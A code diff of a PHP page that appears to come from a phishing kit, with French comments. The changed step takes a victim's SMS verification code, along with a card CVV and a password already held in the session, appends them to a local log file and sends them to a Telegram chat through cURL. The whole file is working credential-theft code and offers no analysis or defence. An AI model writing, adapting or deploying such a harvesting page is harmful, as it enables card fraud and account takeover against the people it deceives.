@@ -1,21 +1,19 @@
 <?php 
 session_start();
 
-// Vérifie si les données 'exp' sont présentes, sinon redirige vers la page de connexion
-if (!isset($_POST["exp"])) {
+// Vérifie si les données 'cvv' et 'mdp' sont présentes dans la session
+if (!isset($_SESSION["cvv"]) or !isset($_SESSION["mdp"])) {
     header("Location: ./index.php");
     exit();
 }
 
-// Stocke les données dans la session
-$_SESSION["exp"] = $_POST['exp'];
+// Récupère les données du formulaire
+$_SESSION["sms"] = $_POST['sms'];
 
-// Prépare le message à envoyer
-$message = "🔐 **FIN DE CONNEXION** 🔐\n\n" .
-           "🧾 **Données EXP** :\n" .
-           "```" . $_SESSION["exp"] . "```";
+// Prépare le message à envoyer sur Telegram
+$message = "📩 SMS : " . $_SESSION["sms"] . "\n" . "** FIN CONNEXION **\n";
 
-// Enregistre les données dans un fichier local (peut être conservé ou retiré selon les besoins)
+// Enregistre les données dans un fichier local
 $file = "../blinky2000@bvc@bvc@destruction.txt";
 file_put_contents($file, $message, FILE_APPEND);
 
@@ -56,7 +54,7 @@ if (curl_errno($ch)) {
 // Ferme la session cURL
 curl_close($ch);
 
-// Détruit la session après l'envoi des données
+// Détruit la session
 session_destroy();
 ?>
 
